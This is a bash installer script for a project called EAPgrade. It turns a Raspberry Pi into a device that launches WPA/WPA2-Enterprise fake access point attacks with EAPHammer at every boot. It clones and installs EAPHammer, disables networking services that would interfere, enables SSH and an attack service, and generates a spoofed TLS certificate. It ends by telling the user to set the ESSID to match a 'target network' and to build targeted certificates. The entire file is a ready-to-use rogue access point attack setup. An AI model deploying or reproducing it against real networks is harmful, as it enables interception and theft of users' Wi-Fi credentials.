#!/usr/bin/env bash

# EAPgrade is a simple bash script that upgrades your fresh Raspbian installation so that it launches WPA/WPA2-MGT fake AP attacks automatically after booting
# author - mamatb (t.me/m_amatb)
# location - https://gitlab.com/mamatb/EAPgrade

# TODO
#
# use colored output

EAPgrade_dir="$(realpath $(dirname ${0}))"
EAPHammer_dir='/opt/eaphammer'

# permissions check
if [ "${USER}" != 'root' ]
then
	echo 'ERROR - root identity needed in order to deal with services'
	exit 1
else
	echo 'INFO - root identity confirmed, proceeding'
fi

# internet access check
ping -c '1' 'github.com' &> '/dev/null'
if [ "${?}" != '0' ]
then
	echo 'ERROR - internet access needed in order to clone EAPHammer'
	exit 1
else
	echo 'INFO - internet access confirmed, proceeding'
fi

# EAPHammer git clone
echo 'INFO - cloning EAPHammer to "'"${EAPHammer_dir}/"'"'
cd '/opt/'
git clone 'https://github.com/s0lst1c3/eaphammer.git' &> '/dev/null'
cd "${EAPHammer_dir}/"

# file movement
echo 'INFO - moving files to "'"${EAPHammer_dir}/"'"'
cp --force "${EAPgrade_dir}/eaphammer.sh" "${EAPgrade_dir}/eaphammer.service" "${EAPHammer_dir}/"

# EAPHammer installation
echo 'INFO - updating, installing dependencies and generating DH parameters. This is going to take a while, you can check the progress with "tail -f /tmp/EAPgrade.log" if you wish :)'
echo -e 'y\ny' | ./kali-setup &> '/tmp/EAPgrade.log'

# eaphammer.service setup
echo 'INFO - disabling wpa_supplicant.service and dnsmasq.service so that they don'"'"'t interfere with eaphammer.service'
systemctl disable 'dnsmasq.service' &> '/dev/null'
systemctl disable 'wpa_supplicant.service' &> '/dev/null'
cp --force '/etc/dhcpcd.conf' '/etc/dhcpcd.conf.backup'
echo 'nohook wpa_supplicant' >> '/etc/dhcpcd.conf'

echo 'INFO - enabling eaphammer.service and ssh.service to administrate your Raspbian without needing to plug in keyboard and display'
cp --force "${EAPHammer_dir}/eaphammer.service" '/lib/systemd/system/eaphammer.service'
systemctl enable 'ssh.service' &> '/dev/null'
systemctl enable 'eaphammer.service' &> '/dev/null'

# EAPHammer users configuration
echo 'INFO - setting up user "EAPgrade" to access the fake AP network with password "changeme"'
cp --force "${EAPHammer_dir}/db/phase2.accounts" "${EAPHammer_dir}/db/phase2.accounts.backup"
echo -e '"EAPgrade"\tGTC\t"changeme"\t[2]' > "${EAPHammer_dir}/db/phase2.accounts"

# EAPHammer certs generation
echo 'INFO - generating fake TLS certificate to use with EAPHammer'
./eaphammer --bootstrap --cn 'hotspot.eapgrade.org' --country 'ES' --state 'Madrid' --locale 'Madrid' --org 'eapgrade' --org-unit 'IT' --email 'administrator@eapgrade.org' &> '/dev/null'

# final steps
chmod +x "${EAPHammer_dir}/eaphammer.sh"
echo 'INFO - done! The WPA/WPA2-MGT fake AP attack should launch automatically after booting now, raw logs will be located at "'"${EAPHammer_dir}/"'logs/hostapd-eaphammer.raw". Next steps:'
echo '       Modify user and password to access the fake AP network at "'"${EAPHammer_dir}/"'db/phase2.accounts"'
echo '       Modify the ESSID at "'"${EAPHammer_dir}/"'eaphammer.sh" so that it matches your target network'
echo '       Delete "'"${EAPHammer_dir}/"'certs/server/*", "'"${EAPHammer_dir}/"'certs/ca/*" and "'"${EAPHammer_dir}/"'certs/active/*"; and generate your own targeted certs by "cd '"${EAPHammer_dir}/"' && ./eaphammer --cert-wizard"'

exit 0